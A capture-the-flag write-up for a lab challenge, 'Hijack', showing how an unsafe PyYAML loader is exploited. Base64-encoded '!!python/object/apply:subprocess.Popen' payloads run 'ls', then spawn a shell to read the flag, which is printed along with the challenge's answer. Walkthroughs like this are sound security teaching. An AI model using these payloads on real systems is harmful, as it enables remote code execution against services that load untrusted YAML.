# Hijack
## Description
The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship's Thermal Control System. Can you take advantage of the situation without raising any suspicion?

### Difficulty: easy
---
We are given an IP address and port to nc into:
```
nc 159.65.94.38 30109
```

Upon connection, we are greeted with a simple menu system:
```
<------[TCS]------>
[1] Create config                                                                                                                                                                                                                          
[2] Load config                                                                                                                                                                                                                            
[3] Exit
```

Trying to create a config, we see very few input checks in place:
```
> 1                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
- Creating new config -                                                                                                                                                                                                                    
Temperature units (F/C/K): A                                                                                                                                                                                                               
Propulsion Components Target Temperature : B                                                                                                                                                                                               
Solar Array Target Temperature : C                                                                                                                                                                                                         
Infrared Spectrometers Target Temperature : D                                                                                                                                                                                              
Auto Calibration (ON/OFF) : E                                                                                                                                                                                                              
                                                                                                                                                                                                                                           
Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K                                        
Uploading to ship...                                                                                                                                                                                                                       
                                                                                                                                                                                                                                              
```

The returned serialized config looks to be base64 encoded, so let's see what this contains:
```
$ echo "ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K" | base64 -d
!!python/object:__main__.Config {IR_spectrometer_temp: D, auto_calibration: E, propulsion_temp: B,
  solar_array_temp: C, units: A}
```

It looks like our config options that we created. However, loading this config fails even though creation was successful. A quick google search indicates that this `!!python/object:__main__` syntax is from PyYAML. There is a page on hacktricks that details how one might go about exploiting this: https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization

Under RCE category, we see it might be possible to execute shell command with the right syntax.
Testing the exploit:
```
$ echo '!!python/object/apply:subprocess.Popen                                                                                                                                                       
- ls' | base64
ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo=
```
Loading base64 config:
```
<------[TCS]------>
[1] Create config                                                                                                                                                                                                                          
[2] Load config                                                                                                                                                                                                                            
[3] Exit                                                                                                                                                                                                                                   
> 2                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                           
Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo=                                                                                                                                                    
** Success **                                                                                                                                                                                                                              
Uploading to ship...                                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
<------[TCS]------>                                                                                                                                                                                                                        
[1] Create config                                                                                                                                                                                                                          
[2] Load config                                                                                                                                                                                                                            
[3] Exit                                                                                                                                                                                                                                   
> chall.py                                                                                                                                                                                                                                 
flag.txt                                                                                                                                                                                                                                   
hijack.py
```

`ls` is successfully executing! Now to read the flag.

I had some trouble producing a payload that would simply cat the flag.txt file. Presumably, my payload setup was not suitable for a command with several words (cat flag.txt), so to work around this I simply spawned a shell:
```
!!python/object/apply:subprocess.Popen
- sh
```

```
$ cat payload | base64 
ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo=
```

```
<------[TCS]------>
[1] Create config                                                                                                   
[2] Load config                                                                                                     
[3] Exit                                                                                                            
> 2                                                                                                                 
                                                                                                                    
Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo=                             
** Success **                                                                                                       
Uploading to ship...                                                                                                
                                                                                                                    
<------[TCS]------>                                                                                                 
[1] Create config                                                                                                   
[2] Load config                                                                                                     
[3] Exit                                                                                                            
> cat flag.txt                                                                                                      
HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}
```
`HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}`